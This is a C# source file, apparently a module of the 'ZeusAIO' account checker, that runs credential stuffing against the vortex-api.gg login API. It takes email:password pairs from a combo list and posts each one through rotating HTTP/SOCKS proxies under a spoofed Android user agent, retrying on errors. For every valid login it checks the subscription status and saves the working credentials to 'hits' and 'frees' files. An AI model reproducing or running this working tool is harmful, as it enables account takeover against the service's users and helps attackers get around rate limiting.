using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Vortexgg
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.IgnoreProtocolErrors = true;
                            var rndd = new Random();
                            int bolbol = rndd.Next(1000, 9999);

                            req.UserAgent = "RemotrAndroid/1.5.0";
                            req.AddHeader("accept-encoding", "gzip");
                            req.AddHeader("Host", "vortex-api.gg");
                            var res = req.Post("https://vortex-api.gg/login", string.Concat(new string[]
                                 {
                        string.Concat(new string[]
                        {
                            "{\"email\":\"" + s[0] + "\",\"name\":\"SeliaxwasHere GM" + bolbol + "\",\"pass\":\"" + s[1] + "\"}"
                        })
                                 }), "application/json; charset=UTF-8").ToString();

                            switch (res)
                            {
                                case string a when res.Contains("invalid_email") || res.Contains("account_not_exists") || res.Contains("invalid_password"):
                                    break;
                                case string b when res.Contains("status\":\"success"):
                                    var token = Check.Parse(res, "{\"token\":\"", "\"");
                                    req.UserAgent = "RemotrAndroid/1.5.0";
                                    req.AddHeader("accept-encoding", "gzip");
                                    req.AddHeader("Host", "vortex-api.gg");
                                    res = req.Get("https://vortex-api.gg/users/" + token + "/account").ToString();
                                    var doessub = Check.Parse(res, "is_subscribed\":", ",");
                                    if (doessub == "true")
                                    {
                                        var subby = Check.Parse(res, "\"subscribed_via\":\"", "\",\"");
                                        var sub2 = Check.Parse(res, "\"type\":\"", "\"");
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - VORTEX.GG] " + s[0] + ":" + s[1] + " | Type: " + sub2 + " | Subscribed By: " + subby, Color.Green);
                                        }
                                        Export.AsResult("/Vortex_hits", s[0] + ":" + s[1] + " | Type: " + sub2 + " | Subscribed By: " + subby);
                                    }
                                    else
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - VORTEX.GG] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Vortex_frees", s[0] + ":" + s[1]);
                                    }
                                    break;
                                default:
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                    break;
                            }
                        }
                    }
                    catch (Exception err)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}


               